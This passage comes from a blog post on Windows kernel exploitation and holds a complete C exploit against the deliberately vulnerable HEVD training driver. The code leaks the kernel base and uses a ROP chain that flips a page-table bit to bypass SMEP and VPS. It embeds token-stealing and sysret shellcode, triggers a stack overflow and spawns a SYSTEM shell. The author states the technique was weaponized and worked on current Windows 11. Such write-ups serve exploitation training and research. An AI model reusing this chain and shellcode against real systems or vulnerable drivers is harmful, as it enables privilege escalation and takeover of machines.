</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">EnumDeviceDrivers</span><span class="p">(</span><span class="n">lpImageBase</span><span class="p">,</span> <span class="n">dwBytesNeeded</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwBytesNeeded</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] EnumDeviceDrivers: %d&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">lpImageBase</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">HeapFree</span><span class="p">(</span><span class="nf">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">lpImageBase</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">pKernelBaseAddress</span> <span class="o">=</span> <span class="p">((</span><span class="n">ULONG_PTR</span> <span class="o">*</span><span class="p">)</span><span class="n">lpImageBase</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nf">HeapFree</span><span class="p">(</span><span class="nf">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">lpImageBase</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Kernel Base Address: %llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">pKernelBaseAddress</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">pKernelBaseAddress</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">GenerateBuffer</span><span class="p">(</span><span class="kt">int64_t</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">int64_t</span> <span class="n">kernel_base</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int64_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">259</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int64_t</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Generating buffer to bypass VPS and disable SMEP</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/* Prepare RDX register for later. This is needed for the XOR operation */</span>
</span></span><span class="line"><span class="cl">    <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x3f99ce</span><span class="p">;</span> <span class="c1">// pop rdx ; pop rax ; pop rcx ; ret [nt]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span>               <span class="mh">0x000008</span><span class="p">;</span> <span class="c1">// Set RDX to 0x08, we will need this to accomplish the XOR
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span>               <span class="mh">0x000000</span><span class="p">;</span> <span class="c1">// [filler]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span>               <span class="mh">0x000000</span><span class="p">;</span> <span class="c1">// [filler]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* Setup the call to MiGetPteAddress in order to get the address of the PTE for our
</span></span></span><span class="line"><span class="cl"><span class="cm">       userland code. The setup is as follows:
</span></span></span><span class="line"><span class="cl"><span class="cm">  
</span></span></span><span class="line"><span class="cl"><span class="cm">         RAX -&gt; VOID *MiGetPteAddress(
</span></span></span><span class="line"><span class="cl"><span class="cm">           ( RCX == PTE / Userland Code )
</span></span></span><span class="line"><span class="cl"><span class="cm">         );
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">       Once the call is complete RAX should contain the pointer to our PTE. */</span>
</span></span><span class="line"><span class="cl">    <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xa74d93</span><span class="p">;</span> <span class="c1">// pop rcx ; ret     [nt]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span><span class="n">shellcode</span><span class="p">;</span>     <span class="c1">// *shellcode        [nt]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x26b560</span><span class="p">;</span> <span class="c1">// MiGetPteAddress() [nt]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* Now that we have obtained the PTE address, we can modify the 2nd bit in order to
</span></span></span><span class="line"><span class="cl"><span class="cm">       mark the page as a kernel page (U -&gt; K). We can do this using XOR ;) */</span>
</span></span><span class="line"><span class="cl">    <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x2ffbfb</span><span class="p">;</span> <span class="c1">// sub rax, rdx ; ret                [nt]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xa6f2f5</span><span class="p">;</span> <span class="c1">// push rax ; pop rbx ; ret          [nt]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x3f99ce</span><span class="p">;</span> <span class="c1">// pop rdx ; pop rax ; pop rcx ; ret [nt]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span>               <span class="mh">0x000004</span><span class="p">;</span> <span class="c1">// When we XOR the PTE by 0x4 we flip the 2nd bit (U -&gt; K)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span>               <span class="mh">0x000000</span><span class="p">;</span> <span class="c1">// [filler]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span>               <span class="mh">0x000000</span><span class="p">;</span> <span class="c1">// [filler]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x2107b2</span><span class="p">;</span> <span class="c1">// xor  [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret [nt]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* Now we can spray our shellcode address since SMEP and VPS should be bypassed */</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mh">0xC</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span><span class="n">shellcode</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Calling shellcode: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">hHEVD</span>                          <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">bytesReturned</span>                   <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int64_t</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">]</span>           <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int64_t</span> <span class="n">kernelBaseAddr</span>                <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">LPVOID</span> <span class="n">lpMemory</span>                       <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// python3 sickle.py -p windows/x64/kernel_token_stealer -f c -m pinpoint
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span> <span class="c1">// movabs rax, qword ptr gs:[0x188]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\x8b\x80\xb8\x00\x00\x00</span><span class="s">&#34;</span>                 <span class="c1">// mov rax, qword ptr [rax + 0xb8]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\x89\xc1</span><span class="s">&#34;</span>                                 <span class="c1">// mov rcx, rax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\xb2\x04</span><span class="s">&#34;</span>                                     <span class="c1">// mov dl, 4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\x8b\x80\x48\x04\x00\x00</span><span class="s">&#34;</span>                 <span class="c1">// mov rax, qword ptr [rax + 0x448]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\x2d\x48\x04\x00\x00</span><span class="s">&#34;</span>                     <span class="c1">// sub rax, 0x448
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x38\x90\x40\x04\x00\x00</span><span class="s">&#34;</span>                     <span class="c1">// cmp byte ptr [rax + 0x440], dl
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x75\xeb</span><span class="s">&#34;</span>                                     <span class="c1">// jne 0x1017
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\x8b\x90\xb8\x04\x00\x00</span><span class="s">&#34;</span>                 <span class="c1">// mov rdx, qword ptr [rax + 0x4b8]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\x89\x91\xb8\x04\x00\x00</span><span class="s">&#34;</span>                 <span class="c1">// mov qword ptr [rcx + 0x4b8], rdx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> 
</span></span><span class="line"><span class="cl">    <span class="c1">// python3 sickle.py -p windows/x64/kernel_sysret -f c -m pinpoint
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span> <span class="c1">// movabs rax, qword ptr gs:[0x188]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x66\x8b\x88\xe4\x01\x00\x00</span><span class="s">&#34;</span>                 <span class="c1">// mov cx, word ptr [rax + 0x1e4]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x66\xff\xc1</span><span class="s">&#34;</span>                                 <span class="c1">// inc cx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x66\x89\x88\xe4\x01\x00\x00</span><span class="s">&#34;</span>                 <span class="c1">// mov word ptr [rax + 0x1e4], cx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\x8b\x90\x90\x00\x00\x00</span><span class="s">&#34;</span>                 <span class="c1">// mov rdx, qword ptr [rax + 0x90]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\x8b\x8a\x68\x01\x00\x00</span><span class="s">&#34;</span>                 <span class="c1">// mov rcx, qword ptr [rdx + 0x168]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x4c\x8b\x9a\x78\x01\x00\x00</span><span class="s">&#34;</span>                 <span class="c1">// mov r11, qword ptr [rdx + 0x178]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\x8b\xa2\x80\x01\x00\x00</span><span class="s">&#34;</span>                 <span class="c1">// mov rsp, qword ptr [rdx + 0x180]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\x8b\xaa\x58\x01\x00\x00</span><span class="s">&#34;</span>                 <span class="c1">// mov rbp, qword ptr [rdx + 0x158]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x31\xc0</span><span class="s">&#34;</span>                                     <span class="c1">// xor eax, eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x0f\x01\xf8</span><span class="s">&#34;</span>                                 <span class="c1">// swapgs 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\x0f\x07</span><span class="s">&#34;</span><span class="p">;</span>                                <span class="c1">// sysretq
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">shellcodeLength</span> <span class="o">=</span> <span class="p">(</span><span class="mi">58</span> <span class="o">+</span> <span class="mi">71</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">kernelBaseAddr</span> <span class="o">=</span> <span class="nf">GetKernelBaseAddress</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Getting a handle on HEVD</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">hHEVD</span> <span class="o">=</span> <span class="nf">CreateFileA</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="p">(</span><span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                        <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="n">OPEN_EXISTING</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">hHEVD</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Allocating RWX memory</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">lpMemory</span> <span class="o">=</span> <span class="nf">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="n">shellcodeLength</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="p">(</span><span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                            <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Copying shellcode into RWX memory</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">lpMemory</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcodeLength</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Spraying return address: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">lpMemory</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">GenerateBuffer</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">kernelBaseAddr</span><span class="p">,</span> <span class="n">lpMemory</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Triggering control code 0x222003</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hHEVD</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="n">TRIGGER_BUFFER_OVERFLOW_STACK</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="n">buffer</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="n">BUFFER_SIZE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">cmd.exe&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div>

<h1 class="relative group">Exploitation (<a href="https://youtu.be/zZMg9ryeWOw?si=mh-PrkM1kze7zVHq" target="_blank">Rip &amp; Tear</a>) 
    <div id="exploitation-rip--tearhttpsyoutubezzmg9ryewowsimh-prkm1kze7zvhq" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#exploitation-rip--tearhttpsyoutubezzmg9ryewowsimh-prkm1kze7zvhq" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>When writing this post I was so confident in my technique I decided to weaponize it and test it against the latest build of Windows 11, and it worked!</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/0x01-Killing-Windows-Kernel-Mitigations/poc.gif" alt="alt text" />
      
    </figure>
</p>
<p>It&rsquo;s important to keep in mind I had to perform modifications to the aforementioned information. As an example, Token Stealing Shellcode offsets have changed, this was an interesting observation and I plan to update shellcode within Sickle to perform version checking for accurate structure offsets.</p>


<h1 class="relative group">Sources 
    <div id="sources" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#sources" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<pre tabindex="0"><code>https://connormcgarr.github.io/pte-overwrites/
https://m0uk4.gitbook.io/notebooks/mouka/windowsinternal/find-kernel-module-address-todo
https://wumb0.in/finding-the-base-of-the-windows-kernel.html
https://idafchev.github.io/research/2023/06/30/Vulnerable_Driver_Part2.html
https://fluidattacks.com/blog/hevd-smep-bypass/
https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/#
https://www.coresecurity.com/sites/default/files/2020-06/Windows%20SMEP%20bypass%20U%20equals%20S_0.pdf
https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html
</code></pre>
          
          
          
        </div>
        
        

        
        

          
      </div>
     
      
      
        
        
          
          
        
      <script>
        var oid = "views_posts\/0x01-Killing-Windows-Kernel-Mitigations.md"
        var oid_likes = "likes_posts\/0x01-Killing-Windows-Kernel-Mitigations.md"
      </script>
      
      
      <script type="text/javascript" src="/js/page.min.0860cf4e04fa2d72cc33ddba263083464d48f67de06114529043cb4623319efed4f484fd7f1730df5abea0e2da6f3538855634081d02f2d6e920b956f063e823.js" integrity="sha512-CGDPTgT6LXLMM926JjCDRk1I9n3gYRRSkEPLRiMxnv7U9IT9fxcw31q&#43;oOLabzU4hVY0CB0C8tbpILlW8GPoIw=="></script>
      
  
    </section>
  <footer class="pt-8 max-w-prose print:hidden">

    
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="flex group mr-3" href="/posts/0x00-introducci%C3%B3n-a-windows-kernel-explotaci%C3%B3n/">
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >0x00 - Introducción a Windows Kernel Explotación</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
            <a class="flex text-right group ml-3" href="/posts/0x01-mat%C3%A1ndo-windows-kernel-mitigaciones/">
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >0x01 - Matándo Windows Kernel Mitigaciones</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                </span>
              </span>
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
            </a>
          
        </span>
      </div>
    </div>
  


    
  </footer>
</article>

      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
  <a href="#the-top"
    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top" title="Scroll to top">
    &uarr;
  </a>
</div>
    </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
  
  <div class="flex items-center justify-between">

    
    
    <p class="text-sm text-neutral-500 dark:text-neutral-400">
      © 2017 Milton Valencia. All Rights Reserved
    </p>
    

    
    
    <p class="text-xs text-neutral-500 dark:text-neutral-400">
      
      
      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
    </p>
    

  </div>
  <script>
    
    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
      margin: 24,
      background: 'rgba(0,0,0,0.5)',
      scrollOffset: 0,
    })
    
  </script>
  
  
  <script type="text/javascript" src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js" integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
  data-url="/"
  style="z-index:500"
>
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
  >
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)"
      >
        

  <span class="relative block icon">
